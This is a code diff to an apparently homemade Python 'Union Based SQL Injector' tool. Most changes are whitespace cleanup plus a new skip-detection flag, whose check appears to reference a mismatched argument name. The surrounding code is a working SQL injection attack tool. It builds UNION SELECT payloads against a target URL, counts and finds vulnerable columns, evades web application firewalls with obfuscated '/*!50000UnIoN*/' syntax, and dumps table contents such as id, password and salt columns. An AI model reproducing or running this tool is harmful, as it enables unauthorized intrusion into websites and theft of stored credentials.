@@ -27,8 +27,9 @@ TO DO LIST
 0x1: Implement a check for WAF
 0x2: Implement a check for ending url "--" or "--+-" or "--+--" or even "#"
 0x3: Format the table data nicely to print
-0x4: Maybe implement a session file for each site like sqlmap, to record 
+0x4: Maybe implement a session file for each site like sqlmap, to record
      vulnerable columns, databases, and tables, to enable --dump function.
+0x5: Create a class for target url. So class.next_column will return object from generator
 """
 
 sql_Error = [
@@ -63,21 +64,22 @@ YELLOW  = '\033[93m'
 END     = '\033[0m'
 
 banner = RED + BOLD + """
- _____ _____ __       _____     _         
-|   __|     |  |     |  |  |___|_|___ ___ 
+ _____ _____ __       _____     _
+|   __|     |  |     |  |  |___|_|___ ___
 |__   |  |  |  |__   |  |  |   | | . |   |
 |_____|__  _|_____|  |_____|_|_|_|___|_|_|
-         |__|                             
+         |__|
 """ + END + YELLOW + """
 ------------------------
 | Union Based Injector |
-------------------------    
-""" + END + GREEN + """    
+------------------------
+""" + END + GREEN + """
                                 | zerouplink |
                                 |┌∩┐(◣_◢)┌∩┐ |
                                 | Hell yeah  |
 
 """ + END
+
 
 class website:
 
@@ -94,6 +96,7 @@ class website:
         parser = argparse.ArgumentParser(prog="Union Based SQL Injector",description="Union Based SQL injector")
         parser.add_argument("-t","--target", help="Target URL")
         parser.add_argument("-v","--verbose",help="Enable Verbose mode",action="store_true")
+        parser.add_argument("-s","--skip-detection", help="Skip Error Checking, if you are sure the site is vulnerable", action="store_true")
         # parser.add_argument("-i","--ignore",help="Ignore Saved Session",action="store_true")
         # parser.add_argument("-d","--dump", help="Dump the following table")
         args = parser.parse_args()
@@ -134,7 +137,6 @@ class website:
         # elif args.dump != "":
         #     self.
 
-
     def _initVar(self):
         """
         A function kept separately to init variables
@@ -153,6 +155,9 @@ class website:
         self.waf           = False
 
     def testError(self):
+        if args.skip == True:
+            print(GREEN+"[+] Skipping Error Detection"+END)
+            return
         print(YELLOW+"[+] Testing webpage for sql errors"+END)
         content = self.getpage(self.url)
         self.vulnerable = False
@@ -186,7 +191,7 @@ class website:
 
             logging.info(injUrl)
             page = self.getpage(injUrl)
-            
+
             sys.stdout.write(str(" "+str(colno)))
             sys.stdout.flush()
 
@@ -199,18 +204,18 @@ class website:
             print(RED+"[!] Cannot find the column count!")
             print("[!] Target might be blocking Query with WAF"+END)
             sys.exit(1)
-            
+
     def columnCounterGroupBy(self):
         """
             2 Approaches
 
             1. Find column the normal way, order by 1000....
-               Harder to detect a pattern between page saying "Unknown Column" or 
+               Harder to detect a pattern between page saying "Unknown Column" or
                Simply a page with content different or 404
 
             2. Find column with union select, therefore know the vulnerable column
                As well as the column count, but the column count may not be correct
-               as it will stop as soon as the string injected is found inside the 
+               as it will stop as soon as the string injected is found inside the
                html response
 
             Decided to try 2nd approach first, since the downfall is negligible
@@ -235,7 +240,7 @@ class website:
             column = 0
             print(RED+"[~] Could not find column with Group By")
             print("[~] Trying manual method with Order By"+END)
-            self.columnCounterOrderBy() 
+            self.columnCounterOrderBy()
 
     def FindVulnColumnManual(self):
         # Change this if needed to detect the WAF Firewall
@@ -248,7 +253,7 @@ class website:
         baseUrl = self.url.replace("=","=-").strip("'") + "+UNION+ALL+SELECT+"
         self.columnRange = ",".join([str(i) for i in range(1,self.columnCount+1)])
 
-        for colno in range(1,self.columnCount+1):    
+        for colno in range(1,self.columnCount+1):
             injUrl = baseUrl + self.columnRange.replace(str(colno),inj_hex_msg) + "--"
             page = self.getpage(injUrl)
 
@@ -282,11 +287,11 @@ class website:
         waf_string = "406 Not Acceptable"
         baseUrl = self.url.replace("=","=-").strip("'") + "+/*!50000UnIoN*/+/*!50000AlL*/+/*!50000SeLeCt*/+"
         columnRange = [int(str(i)*5) for i in range(1,self.columnCount+1)]
-        injUrl = baseUrl + ",".join([str(i) for i in columnRange])+"--"      
+        injUrl = baseUrl + ",".join([str(i) for i in columnRange])+"--"
         page = self.getpage(injUrl)
 
         logging.info(injUrl)
-        
+
         self.vulnColumn = []
         for col in columnRange:
             if str(col) in page:
@@ -301,7 +306,7 @@ class website:
             print("\n[+] Vulnerable Column Number(s) : %s" % self.vulnColumn)
 
     def displayInfo(self):
-        """ 
+        """
         Display Database name
         User, hosts, version... etc
         """
@@ -374,7 +379,7 @@ class website:
             concat = 'group_concat(0x2e3a,%s,0x3a2e)' % ",0x7c,".join([str(i) for i in column])
             # eg : 'group_concat(0x2e3a,id,0x7c,pass,0x7c,salt,0x3a2e'
             #                      .:   id   .  pass   .  salt   :.
-            tail = "+from+%s--" % (self.databases+"."+table) 
+            tail = "+from+%s--" % (self.databases+"."+table)
             query = self.unionUrl.replace('$',concat) + tail
 
             logging.info(query)
@@ -422,14 +427,14 @@ class website:
 
 class Log:
     def __init__(self):
-        try: 
+        try:
             open(session_log).read()
         except IOError:
             open(session_log,'w')
     def check_log(self,url):
         """
         To check if the given URL exists
-        in the log file. 
+        in the log file.
         Returns True or False
         """
         data = self.read_log()
@@ -466,6 +471,7 @@ class URL:
             print("[!] No injection point defined")
             print("[!] URL need to have = in them")
             sys.exit(1)
+
 
 if __name__ == "__main__":
     app = website()
